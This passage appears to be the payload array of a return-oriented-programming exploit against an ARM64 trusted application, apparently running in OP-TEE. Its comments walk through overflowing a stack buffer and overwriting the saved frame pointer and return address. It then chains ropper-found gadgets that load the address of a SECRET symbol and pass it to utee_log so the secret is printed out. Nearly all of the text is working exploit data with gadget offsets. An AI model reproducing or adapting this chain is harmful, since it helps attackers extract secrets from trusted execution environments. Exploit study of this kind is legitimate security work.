        // FIRST: FILL ORDINARY BUFFER ABOVE OTHER STACK VARIABLES
        // Ordinary Buffer Contents: 16*sizeof(char*)= 16*8 = 128 bytes
        1,2, 3,4,  4,5, 6,7,   8,9, 10,11,  12,13, 14,15, 
        
        // ================================
        // objdump
        /* 
            ldp     x29, x30, [sp, #16]
            ldp     x19, x20, [sp, #32]
            ldp     x21, x22, [sp, #48]
            ldp     x23, x24, [sp, #64]
            ldr     x25, [sp, #80]
            add     sp, sp, #0xe0
            ret
        */ 
        // SECOND: THEN FILL STACK VARIABLES, AND CALLEE SAVED REGISTERS ACCORDING TO THE EPILOGUE OF THE CURRENT FUNCTION
        // INCLUDING RETURN POINTER AT THE APPROPRIATE LOCATION
        
        // v--- SP
        16,17, // 16 bytes varargs
        // v--- x29, x30 before
        0xffffffffffffffff, 0x00001de0 + load_base, 
        // v--- remaining 0xE0 - (2*16) = 192 bytes = 24 pointers
        1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,
        // return!
        
        // ================================
        // ropper: 0x00001de0: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret
        // THIRD: PLACE THE APPROPRIATE DATA FOR OUR GADGET EPILOGUE ON THE STACK, INCLUDING THE NEXT GADGETS RETURN POINTER
        // CURRENT GADGET: LOAD DATA TO X19 IN A GENERIC WAY
        
        // v--- SP        
        // v--- x29, x30
        0xffffffffffffffff, 0x00001de0 + load_base, 
        // v--- size to x19 (later x0), dontcare x20
        49, 0xffffffffffffffff, 
        
        // return!
        // ================================
        // ropper: 0x00001de0: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret
        // CURRENT GADGET: MOVE DATA TO X0 AND LOAD DATA TO X19
        
        // v--- SP        
        // v--- x29, x30
        0xffffffffffffffff, 0x0000000000003534+20 + load_base,
        /*
            0000000000036ec0 <SECRET>:
   36ec0:       0002fb0f        .inst   0x0002fb0f ; undefined
        */
        // v--- secret to x19, dontcare x20
        0x0002fb0f+load_base, 0xffffffffffffffff, 
        // return!
        
        // ================================
        // call b log_utee from <trace_ext_puts> with char* x19, size_t x0
        // gdb: 
        /*
            0000000000003534 <trace_ext_puts>:
            ...
            <trace_ext_puts+20>          mov    x1, x0                                
            <trace_ext_puts+24>          mov    x0, x19                               
            <trace_ext_puts+28>          ldr    x19, [sp, #16]                        
            <trace_ext_puts+32>          ldp    x29, x30, [sp], #32                   
            <trace_ext_puts+36>          b      0x40019c80 <utee_log>               
        */
        // CURRENT GADGET: CALL UTEE_LOG WITH X0 AND X19 IN X1 AND X0
        
        // v--- SP
        // v--- x29 and x30
        0xffffffffffffffff, 0x0000000000009c74 + load_base,
        // v---- x19, unused
        1,2,
        // branch, and wait for return!
        
        // ================================
        /* 0000000000009c74 <utee_return>:
                mov     x8, #0x0                        // #0
                svc     #0x0
                ret
        */
        // this may loop endlessly, because it assumes being called via "bl" with some other x30 and not via "ret x30"
        
        // // call log_utee with char* x0, size_t x1
        // // 0x0000000000003170 /* objdump offset */ + 0x4000d000 /* base load address */ /* no +LMA of 0x20... */  